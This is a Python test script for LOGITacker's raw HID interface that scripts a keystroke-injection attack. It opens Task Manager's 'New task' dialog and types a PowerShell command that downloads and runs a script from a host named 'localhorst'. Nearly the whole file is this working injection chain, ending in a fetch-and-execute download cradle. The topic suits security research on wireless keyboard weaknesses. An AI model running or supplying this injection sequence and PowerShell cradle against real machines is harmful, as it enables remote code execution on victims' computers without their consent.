#!/usr/bin/python
import sys
import struct
import time

'''
Important: This is a test script for LOGITacker's HID based programming interface.
The script assumes the raw HID interface accessible on /dev/hidraw0 and writes data to
this dev-file. There is no proper implementation to directly interface with LOGITacker on 
the USB HID layer, neither is the protocol finalized.
'''

# report types
REPORT_TYPE_COMMAND = 0x02

# commands
COMMAND_SCRIPT_STRING = 0x10
COMMAND_SCRIPT_ALTSTRING = 0x11
COMMAND_SCRIPT_PRESS = 0x12
COMMAND_SCRIPT_DELAY = 0x13
COMMAND_SCRIPT_CLEAR = 0x14

def build_report(cmd, args=""):
	report = chr(REPORT_TYPE_COMMAND) + chr(cmd) + args
	report = report + (64 - len(report)) * '\x00'
	return report

def cmd_string(str=""):
	l = len(str)
	if l > 60:
		l = 60

	return build_report(COMMAND_SCRIPT_STRING, chr(l) + str[:l])

def cmd_altstring(str=""):
	l = len(str)
	if l > 60:
		l = 60

	return build_report(COMMAND_SCRIPT_ALTSTRING, chr(l) + str[:l])

def cmd_press(str=""):
	l = len(str)
	if l > 60:
		l = 60

	return build_report(COMMAND_SCRIPT_PRESS, chr(l) + str[:l])

def cmd_delay(delay=1):
	d_str = struct.pack('<I',delay)
	return build_report(COMMAND_SCRIPT_DELAY, d_str)

def cmd_clear():
	return build_report(COMMAND_SCRIPT_CLEAR, "")

def split_string(n, st):
	lst = [""]
	for i in str(st):
		l = len(lst) - 1
		if len(lst[l]) < n:
			lst[l] += i
		else:
			lst += [i]
	return lst

file = "/dev/hidraw0"

with open(file, 'wb') as of:
	of.write(cmd_clear())
	of.flush()

	of.write(cmd_delay(500))
	of.flush()

	of.write(cmd_press("CTRL SHIFT ESCAPE"))
	of.flush()

	of.write(cmd_delay(800))
	of.flush()

	of.write(cmd_press("ALT"))
	of.flush()

	of.write(cmd_press("DOWN"))
	of.flush()

	of.write(cmd_press("N"))
	of.flush()

	of.write(cmd_delay(800))
	of.flush()

	ps_code = "powershell -C \"iex (New-Object Net.Webclient).DownloadString('http://localhorst:8001/about.txt');exit\""
	for chunk in split_string(60,ps_code):
		of.write(cmd_altstring(chunk))
		of.flush()

	of.write(cmd_press("RETURN"))
	of.flush()

#	of.write(cmd_delay(800))
#	of.flush()

#	of.write(cmd_press("CTRL SHIFT ESCAPE"))
#	of.flush()
#
#	of.write(cmd_delay(200))
#	of.flush()
#
#	of.write(cmd_press("ALT F4"))
#	of.flush()

